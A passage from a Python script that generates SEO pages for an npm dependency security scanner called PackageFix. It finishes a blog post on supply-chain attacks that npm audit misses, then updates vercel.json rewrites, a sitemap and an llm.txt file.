  <li>Check the results: CVE table, CISA KEV banner, ZOMBIE badges, TYPOSQUAT warnings, build script alerts</li>
  <li>Download the fixed package.json if any CVEs are found</li>
</ol>

{cta()}

<h2>The Uncomfortable Truth About npm audit</h2>
<p>npm audit is a good tool. It catches known CVEs reliably and it's built into the npm workflow. But it was designed for a 2018 threat model where the main risk was unpatched dependencies with known CVEs.</p>
<p>The 2026 threat model includes compromised maintainer accounts, invisible Unicode payloads, typosquatting at scale, and malicious build scripts. npm audit doesn't check for any of these — and it was never designed to.</p>
<p>PackageFix is not a replacement for npm audit. It's the layer that catches what npm audit misses. Run both.</p>

{faq_html(blog_faqs)}

<div style="margin:40px 0">
  <h2>Related Guides</h2>
  <div class="related-grid">
    <div class="related-card"><a href="/fix/npm/lodash">Fix Lodash CVE-2020-8203</a><p>CISA KEV — prototype pollution</p></div>
    <div class="related-card"><a href="/fix/npm/vm2">Fix vm2 CVE-2023-29017</a><p>CISA KEV — sandbox escape RCE</p></div>
    <div class="related-card"><a href="/cisa-kev">CISA KEV Package List</a><p>All actively exploited packages</p></div>
    <div class="related-card"><a href="/npm">npm Security Overview</a><p>All npm vulnerability guides</p></div>
  </div>
</div>
"""

blog_schemas = [
    {"@type":"Article",
     "headline":"5 Supply Chain Attacks Hiding in Your package.json Right Now",
     "description":"npm audit misses Glassworm Unicode injection, zombie packages, typosquatting, build script injection, and CISA KEV entries. Here's what to look for.",
     "datePublished":"2026-03-22","dateModified":"2026-03-22",
     "author":{"@type":"Organization","name":"MetricLogic","url":"https://packagefix.dev"},
     "publisher":{"@type":"Organization","name":"PackageFix","url":"https://packagefix.dev"},
     "mainEntityOfPage":{"@type":"WebPage","@id":BASE_URL+"/blog/supply-chain-attacks-package-json"}},
    {"@type":"BreadcrumbList","itemListElement":[
        {"@type":"ListItem","position":1,"name":"PackageFix","item":BASE_URL},
        {"@type":"ListItem","position":2,"name":"Blog","item":BASE_URL+"/blog"},
        {"@type":"ListItem","position":3,"name":"Supply Chain Attacks in package.json","item":BASE_URL+"/blog/supply-chain-attacks-package-json"}
    ]},
    {"@type":"FAQPage","mainEntity":[
        {"@type":"Question","name":q,"acceptedAnswer":{"@type":"Answer","text":a}}
        for q,a in blog_faqs
    ]}
]

write("blog/supply-chain-attacks-package-json", shell(
    "5 Supply Chain Attacks Hiding in Your package.json — PackageFix",
    "npm audit misses Glassworm Unicode injection, zombie packages, typosquatting, build script injection, and CISA KEV entries. Here's what to look for and how to detect them.",
    "/blog/supply-chain-attacks-package-json",
    [("PackageFix","/"),("Blog","/blog"),("Supply Chain Attacks in package.json",None)],
    blog_body, blog_schemas
))

# ══════════════════════════════════════════════════════════════════════════════
# UPDATE ALL CONFIG FILES
# ══════════════════════════════════════════════════════════════════════════════

print("\n📝 Updating vercel.json...")
rewrites = []
for p in all_paths:
    rewrites.append({"source": p, "destination": f"/seo{p}/index.html"})
    rewrites.append({"source": p + "/", "destination": f"/seo{p}/index.html"})

vercel_config = {}
if os.path.exists("vercel.json"):
    with open("vercel.json") as f:
        vercel_config = json.load(f)

existing = vercel_config.get("rewrites", [])
existing_sources = {r["source"] for r in existing}
for r in rewrites:
    if r["source"] not in existing_sources:
        existing.append(r)
        existing_sources.add(r["source"])

vercel_config["rewrites"] = existing
with open("vercel.json", "w") as f:
    json.dump(vercel_config, f, indent=2)
print(f"  ✓ vercel.json — {len(existing)} total rewrites")

print("\n🗺 Updating sitemap-seo.xml...")
new_urls = ""
for p in all_paths:
    priority = "0.9" if p in ["/cisa-kev","/snyk-advisor-alternative"] else "0.8"
    new_urls += f"""  <url>
    <loc>{BASE_URL}{p}</loc>
    <changefreq>{'weekly' if p == '/cisa-kev' else 'monthly'}</changefreq>
    <priority>{priority}</priority>
  </url>\n"""

if os.path.exists("sitemap-seo.xml"):
    with open("sitemap-seo.xml") as f:
        content = f.read()
    updated = content.replace("</urlset>", new_urls + "</urlset>")
else:
    updated = '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n' + new_urls + "</urlset>"
with open("sitemap-seo.xml", "w") as f:
    f.write(updated)
print(f"  ✓ sitemap-seo.xml — {len(all_paths)} new URLs (cisa-kev = weekly crawl)")

print("\n🤖 Updating llm.txt...")
with open("llm.txt", "a") as f:
    f.write("\n## Phase 4 — High-Value Pages\n")
    for p in all_paths:
        f.write(f"{BASE_URL}{p}\n")
print("  ✓ llm.txt updated")

print(f"\n✅ Done — {len(all_paths)} Phase 4 pages generated")
for p in all_paths:
    print(f"   {p}")
